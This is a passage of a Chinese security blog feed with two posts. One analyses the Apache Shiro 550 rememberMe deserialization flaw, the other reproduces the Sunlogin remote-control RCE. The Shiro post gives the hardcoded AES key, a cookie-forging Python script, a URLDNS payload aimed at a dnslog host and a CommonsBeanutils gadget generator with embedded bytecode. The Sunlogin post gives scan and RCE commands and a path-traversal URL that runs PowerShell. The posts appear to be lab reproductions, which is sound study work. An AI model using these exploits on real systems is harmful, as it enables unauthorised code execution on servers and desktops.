src="https://credink.github.io/2022/04/10/shiro550%E5%88%86%E6%9E%90/image-20220407213803255.png"></p><p>点击login链接：<code>http://127.0.0.1:8080/samples_web_war_exploded/login.jsp</code></p><p><img src="https://credink.github.io/2022/04/10/shiro550%E5%88%86%E6%9E%90/image-20220407213828452.png"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="简单总结"><a href="#简单总结" class="headerlink" title="简单总结"></a>简单总结</h2><p>shiro通过对cookie中的rememberme，来认证用户身份信息</p><p><strong>note：有sessionid的时候不会去走rememberme的校验逻辑，测试不要带sessionid</strong></p><p>shiro对rememberme字符串做了AES CBC解密后（密钥是固定写死的），直接对解密结果做了反序列化操作</p><p>因此，攻击者可以生成恶意序列化字符串，并通过固定的密钥做AES CBC加密，生成恶意rememberme字符串</p><p>当shiro检测恶意rememberme字符串时，就会把恶意序列化字符串反序列化，从而被攻击</p><h2 id="流程跟踪"><a href="#流程跟踪" class="headerlink" title="流程跟踪"></a>流程跟踪</h2><p>第一次登录后获取到cookie，带着cookie发起request请求（要删除sessionid，避免影响）</p><p><img src="https://credink.github.io/2022/04/10/shiro550%E5%88%86%E6%9E%90/image-20220409142850256.png"></p><p>在项目里搜索rememberme，发现一个名叫CookieRememberMeMamager的类</p><p><img src="https://credink.github.io/2022/04/10/shiro550%E5%88%86%E6%9E%90/image-20220409142947874.png"></p><p>在structure视窗里看到有三个跟rememberme有关的函数</p><p><img src="https://credink.github.io/2022/04/10/shiro550%E5%88%86%E6%9E%90/image-20220409143315542.png"></p><p>依次点过去，看开头的注释，发现分别时“利用模板构造cookie”、“用序列化的结果设置cookie”、“从cookie里获取rememberme字符串，做base64解码后返回”</p><p>这里对getRememberedSerializedIdentity打断点：</p><p><img src="https://credink.github.io/2022/04/10/shiro550%E5%88%86%E6%9E%90/image-20220409143741100.png"></p><p>step over看看base64解码结果被拿去干啥了：</p><p>这里如果直接步过convertBytesToPrincipals会发现principals的结果为”root”，即AES解密、反序列化后得到的身份判断结果</p><p><img src="https://credink.github.io/2022/04/10/shiro550%E5%88%86%E6%9E%90/image-20220409143936720.png"></p><p>进入convertBytesToPrincipals里面看一下具体操作：</p><p>convertBytesToPrincipals-&gt;decrypt-&gt;cipherService.decrypt（JcaCipherService.java内部几次函数跳转，做AES CBC解密）</p><p>简单来讲，就是对rememberme做AES CBC解密后返回结果</p><p><img src="https://credink.github.io/2022/04/10/shiro550%E5%88%86%E6%9E%90/image-20220409144633763.png"></p><p><img src="https://credink.github.io/2022/04/10/shiro550%E5%88%86%E6%9E%90/image-20220409144357973.png"></p><p><img src="https://credink.github.io/2022/04/10/shiro550%E5%88%86%E6%9E%90/image-20220409145233973.png"></p><p><img src="https://credink.github.io/2022/04/10/shiro550%E5%88%86%E6%9E%90/image-20220409145317978.png"></p><p>AES解密完之后，回归到convertBytesToPrincipals，对解密结果做反序列化操作（也是漏洞点的反序列化触发位置）</p><p><img src="https://credink.github.io/2022/04/10/shiro550%E5%88%86%E6%9E%90/image-20220409145702746.png"></p><p>正常反序列化结果如图所示，判断用户是”root”:</p><p><img src="https://credink.github.io/2022/04/10/shiro550%E5%88%86%E6%9E%90/image-20220409150040657.png"></p><h2 id="AES密钥"><a href="#AES密钥" class="headerlink" title="AES密钥"></a>AES密钥</h2><p>这里的攻击思路很明显了，构造恶意序列化字符串，然后用相同的AES密钥做CBC加密，修改cookie里的rememberme字符串</p><p>shiro就会解密后把恶意序列化字符串反序列化</p><p>那么这里得去找AES的密钥</p><p>decrypt函数里有getDeryptionCipherKey()，明显是获取key的（进入cipherService.decrypt能看到这个传入的就是key）</p><p><img src="https://credink.github.io/2022/04/10/shiro550%E5%88%86%E6%9E%90/image-20220409150336465.png"></p><p>跟进到getDeryptionCipherKey()发现返回的是私有成员变量decryptionCipherKey</p><p><img src="https://credink.github.io/2022/04/10/shiro550%E5%88%86%E6%9E%90/image-20220409150555408.png"></p><p><img src="https://credink.github.io/2022/04/10/shiro550%E5%88%86%E6%9E%90/image-20220409150645777.png"></p><p>看一眼发现构造函数里通过setCipherKey把一个写死的key（DEFAULT_CIPHER_KEY_BYTES）赋值给decryptionCipherKey</p><p><img src="https://credink.github.io/2022/04/10/shiro550%E5%88%86%E6%9E%90/image-20220409150804397.png"></p><p>查看发现DEFAULT_CIPHER_KEY_BYTES是固定写死的 “kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;” base64解密结果（也就是AES的固定密钥）</p><p><img src="https://credink.github.io/2022/04/10/shiro550%E5%88%86%E6%9E%90/image-20220409150904921.png"></p><h1 id="Gadget分析"><a href="#Gadget分析" class="headerlink" title="Gadget分析"></a>Gadget分析</h1><h2 id="原生依赖"><a href="#原生依赖" class="headerlink" title="原生依赖"></a>原生依赖</h2><p>下载了一个名叫maven helper的插件，在samples&#x2F;web&#x2F;pom.xml点击插件页面查看依赖情况：</p><p><img src="https://credink.github.io/2022/04/10/shiro550%E5%88%86%E6%9E%90/image-20220410092655201.png"></p><p><img src="https://credink.github.io/2022/04/10/shiro550%E5%88%86%E6%9E%90/image-20220410092718869.png"></p><p>发现里面有commons-collections-3和commons-beanutils依赖</p><p>但是打包war包时只会把compile和runtime打包，test的属于开发阶段需要使用的，并不会被打包</p><p>所以，实战如果对方是shiro原生的话，打CC是打不到的</p><p>这里真正的依赖只有commons-beanutils，同时JDK自己的链（URLDNS）也是生效的</p><p>补充：为什么很多文章里加入CC4依赖？</p><blockquote><p>因为ysoserial里原生的exp里只有CommonsCollections2（依赖为CC4）是可以直接打原生shiro的</p><p>其他的原生exp，或者是因为依赖问题，或者是因为tomcat里的设计问题等原因，没办法直接用</p><p>也就是说，如果用别的CC依赖和ysoserial对应的EXP，得去魔改一下ysoserial对应的EXP才能打成功</p><p>所以为了方便演示，很多文章里就加入了CC4依赖，方便用ysoserial的CommonsCollections2演示RCE</p></blockquote><p>补充：为什么ysoserial的CommonsBeanutils1不能直接打原生shiro？</p><blockquote><p>ysoserial的CommonsBeanutils1依赖的commons-beanutils版本是1.9.2</p><p>shiro原生依赖的commons-beanutils版本是1.8.3</p><p>直接用ysoserial会报错serialVersionUID不同：</p><p>stream classdesc serialVersionUID &#x3D; -2044202215314119608, local class serialVersionUID &#x3D; -3490850999041592962</p></blockquote><p>最终，ysoserial原生能起作用的就只剩URLDNS</p><p>能打shiro原生的，只有自己去根据CB链，构造攻击exp（保证commons-beanutils版本是1.8.3）</p><h2 id="AES加密脚本"><a href="#AES加密脚本" class="headerlink" title="AES加密脚本"></a>AES加密脚本</h2><p>偷懒直接改了别人一个蛮早的用python写的poc，改成读取本地序列化的文件（ser.bin），并输出加密结果了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import uuid</span><br><span class="line">import base64</span><br><span class="line">import subprocess</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">def encode_rememberme(): </span><br><span class="line">    with open(&quot;ser.bin&quot;,&quot;rb&quot;) as f:</span><br><span class="line">        serbin = f.read()</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)</span><br><span class="line">    iv = uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(serbin)</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    return base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    payload = encode_rememberme()</span><br><span class="line">    print(&quot;rememberMe=&#123;0&#125;&quot;.format(payload.decode()))</span><br></pre></td></tr></table></figure><h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>把ysoserial里URLDNS的内容拉过来（把里面的url改写成dnslog里获取的内容），把结果序列化之后写为本地ser.bin里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">public static void main(final String[] args) throws Exception &#123;</span><br><span class="line">    //URLDNS的内容</span><br><span class="line">    URLStreamHandler handler = new URLDNS.SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">    HashMap ht = new HashMap(); // HashMap that will contain the URL</span><br><span class="line">    URL u = new URL(null, &quot;http://zoyz12.dnslog.cn&quot;, handler); // URL to use as the Key</span><br><span class="line">    ht.put(u, &quot;http://zoyz12.dnslog.cn&quot;); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span><br><span class="line"></span><br><span class="line">    Reflections.setFieldValue(u, &quot;hashCode&quot;, -1); // During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span><br><span class="line"></span><br><span class="line">    //生成序列化字符串并写入文件</span><br><span class="line">    System.out.println(&quot;serializing payload&quot;);</span><br><span class="line">    byte[] ser = Serializer.serialize(ht);</span><br><span class="line">    FileOutputStream fos = new FileOutputStream(&quot;D:\\Code\\Java\\ysoserial-master\\src\\main\\java\\ysoserial\\payloads\\ser.bin&quot;);</span><br><span class="line">    fos.write(ser);</span><br><span class="line">    fos.flush();</span><br><span class="line">    fos.close();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>python运行AES加密脚本</p><p><img src="https://credink.github.io/2022/04/10/shiro550%E5%88%86%E6%9E%90/image-20220410095250272.png"></p><p>启动服务，修改rememberme（不带sessionid，防止影响身份认证的逻辑），发送后dnslog成功收到信息</p><p><img src="https://credink.github.io/2022/04/10/shiro550%E5%88%86%E6%9E%90/image-20220410095549771.png"></p><h2 id="原生CB攻击"><a href="#原生CB攻击" class="headerlink" title="原生CB攻击"></a>原生CB攻击</h2><p>gadget链：</p><blockquote><p>PriorityQueue.readObject &#x3D;&gt; BeanComparator.compare &#x3D;&gt; PropertyUtils,getProperty &#x3D;&gt; TemplatesImpl.getOutputProperties &#x3D;&gt; TemplatesImpl.newTransformer &#x3D;&gt; defineClass-&gt;newInstance</p></blockquote><p>如上文“原生依赖”里说的，这里要保证CB依赖的版本一致，因此这里单独创建的项目，在pom里设置好CB版本为1.8.3，CC为3.1：</p><p><img src="https://credink.github.io/2022/04/10/shiro550%E5%88%86%E6%9E%90/image-20220410173432469.png"></p><p>生成反序列化文件的代码如下：</p><p><strong>note:new BeanComparator()时，CB中默认的构造函数存在CC依赖（默认使用的comparator有CC依赖）</strong></p><p>所以这里需要用另外一个构造函数，传一个无CC依赖的comparator，从而保证规避CC依赖问题</p><p>这里传一个CB里有，或者是JDK里面有的comparator就行</p><p>条件：1.继承Comparator接口2.继承Serializable接口</p><p>去找同时满足这两条的类，然后找交集，这里选的是AttrCompare</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">public static void main(final String[] args) throws Exception &#123;</span><br><span class="line">    // CC3</span><br><span class="line">    byte[] fileData = new BASE64Decoder().decodeBuffer(&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAApIZWxsby5qYXZhDAAOAA8HABwMAB0AHgEABGNhbGMMAB8AIAEABUhlbGxvAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAOAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAEwALAAAABAABAAwAAQAOAA8AAgAJAAAANAACAAIAAAAQKrcAAbgAAkwrEgO2AARXsQAAAAEACgAAABIABAAAABUABAAWAAgAFwAPABgACwAAAAQAAQAQAAEAEQAAAAIAEg==&quot;);// 弹出计算器的序列化字符串</span><br><span class="line">    TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">    Class tc = templates.getClass();</span><br><span class="line">    Field nameField = tc.getDeclaredField(&quot;_name&quot;);</span><br><span class="line">    nameField.setAccessible(true);</span><br><span class="line">    nameField.set(templates, &quot;aaaa&quot;);</span><br><span class="line">    Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">    bytecodesField.setAccessible(true);</span><br><span class="line">    bytecodesField.set(templates, new byte[][] &#123;fileData&#125;);</span><br><span class="line"></span><br><span class="line">    //CB</span><br><span class="line">    BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;,new AttrCompare());// 避免CB原生设计中对CC的依赖</span><br><span class="line"></span><br><span class="line">    //CC2</span><br><span class="line">    TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));</span><br><span class="line">    PriorityQueue&lt;Object&gt; priorityQueue = new PriorityQueue&lt;Object&gt;(1,transformingComparator);</span><br><span class="line">    priorityQueue.add(templates);</span><br><span class="line">    priorityQueue.add(2);</span><br><span class="line">    Class&lt;PriorityQueue&gt; c = PriorityQueue.class;</span><br><span class="line">    Field comparatorField = c.getDeclaredField(&quot;comparator&quot;);</span><br><span class="line">    comparatorField.setAccessible(true);</span><br><span class="line">    comparatorField.set(priorityQueue,beanComparator);</span><br><span class="line"></span><br><span class="line">    //序列化保存成文件</span><br><span class="line">    byte[] ser = ysoserial.Serializer.serialize(priorityQueue);</span><br><span class="line">    FileOutputStream fos = new FileOutputStream(&quot;D:\\Code\\Java\\shiro\\Tester\\src\\main\\java\\ser.bin&quot;);</span><br><span class="line">    fos.write(ser);</span><br><span class="line">    fos.flush();</span><br><span class="line">    fos.close();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用python脚本加密生成rememberme字符串，在burp中修改rememberme，触发弹窗</p><p><img src="https://credink.github.io/2022/04/10/shiro550%E5%88%86%E6%9E%90/image-20220410172553212.png"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.bilibili.com/video/BV1uf4y1T7Rq">https://www.bilibili.com/video/BV1uf4y1T7Rq</a></p><p><a href="http://myblog.ac.cn/archives/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E6%88%98%E4%B9%8Bshiro550#MtCkyNAn">http://myblog.ac.cn/archives/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E6%88%98%E4%B9%8Bshiro550#MtCkyNAn</a></p><h1 id="todo"><a href="#todo" class="headerlink" title="todo"></a>todo</h1><h2 id="CommonCollectionsK1"><a href="#CommonCollectionsK1" class="headerlink" title="CommonCollectionsK1"></a>CommonCollectionsK1</h2><h2 id="JRMP绕过限制"><a href="#JRMP绕过限制" class="headerlink" title="JRMP绕过限制"></a>JRMP绕过限制</h2>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
          <category> 漏洞原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>向日葵RCE漏洞复现</title>
      <link href="/2022/03/26/%E5%90%91%E6%97%A5%E8%91%B5RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/03/26/%E5%90%91%E6%97%A5%E8%91%B5RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>向日葵远程控制软件存在远程命令执行漏洞，远程攻击者在未授权情况下可通过构造特殊请求执行任意命令，存在命令执行漏洞CNVD-2022-10270、CNVD-2022-03672。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>向日葵个人版for Windows &lt;&#x3D; 11.0.0.33826<br>向日葵简约版&lt;&#x3D; V1.0.1.43315（2021.12）</p><span id="more"></span><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>当向日葵客户端在windows运行时，会连接远程Oray的服务器，开放对外接口，接口由sunlogin处理，且开启监听外部的连接访问端口，大概在50000左右，可通过工具测试，低版本向日葵RCE主要发生在对外开放的接口&#x2F;check处，当cmd的值为ping&#x2F;nslookup开头时触发。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="工具（含有漏洞的向日葵安装包）"><a href="#工具（含有漏洞的向日葵安装包）" class="headerlink" title="工具（含有漏洞的向日葵安装包）"></a>工具（含有漏洞的向日葵安装包）</h3><p><a href="https://github.com/ce-automne/SunloginRCE">https://github.com/ce-automne/SunloginRCE</a></p><h3 id="工具复现过程"><a href="#工具复现过程" class="headerlink" title="工具复现过程"></a>工具复现过程</h3><ol><li>运行向日葵（非安装模式直接运行也可以）<br><img src="https://credink.github.io/2022/03/26/%E5%90%91%E6%97%A5%E8%91%B5RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Image.png"></li><li>按照exp的readme运行检测模块<br>sunRce.exe -t scan -h 192.168.8.131 -p 40000-65535 -n 2000<br><img src="https://credink.github.io/2022/03/26/%E5%90%91%E6%97%A5%E8%91%B5RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Image(1).png"></li><li>按照exp的readme执行命令<br>sunRce.exe -t rce -h 192.168.8.131 -p 50967 -c whoami<br><img src="https://credink.github.io/2022/03/26/%E5%90%91%E6%97%A5%E8%91%B5RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Image(2).png"><h3 id="手工复现"><a href="#手工复现" class="headerlink" title="手工复现"></a>手工复现</h3></li><li>端口特点<br>http协议的端口，但是nmap、fscan等工具并不能直接判断目标为向日葵<br>打开<a href="http://ip:port响应如下：">http://ip:port响应如下：</a><blockquote><p><a href="http://192.168.8.131:50967/">http://192.168.8.131:50967</a></p></blockquote></li></ol><p><img src="https://credink.github.io/2022/03/26/%E5%90%91%E6%97%A5%E8%91%B5RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/0.png"><br>2. 获取cookie<br>访问<a href="http://ip:port/cgi-bin/rpc?action=verify-haras">http://ip:port/cgi-bin/rpc?action=verify-haras</a></p><blockquote><p><a href="http://192.168.8.131:50967/cgi-bin/rpc?action=verify-haras">http://192.168.8.131:50967/cgi-bin/rpc?action=verify-haras</a></p></blockquote><p><img src="https://credink.github.io/2022/03/26/%E5%90%91%E6%97%A5%E8%91%B5RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png"><br>3. 携带cookie执行命令，得到命令执行结果<br>设置cookie:CID&#x3D;上面得到的cookie（这里偷个懒直接用CookieEditor插件修改，用burp会更直观），访问<a href="http://ip:port/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+%20命令">http://ip:port/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+%20命令</a></p><blockquote><p><a href="http://192.168.8.131:50967/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe+%20whoami">http://192.168.8.131:50967/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+%20whoami</a></p></blockquote><p><img src="https://credink.github.io/2022/03/26/%E5%90%91%E6%97%A5%E8%91%B5RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png"></p><h2 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h2><p>厂商已发布升级修复漏洞，请及时更新至12.5.0.44227最新版本</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.changchen.cc/archives/73/">https://www.changchen.cc/archives/73/</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 向日葵 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
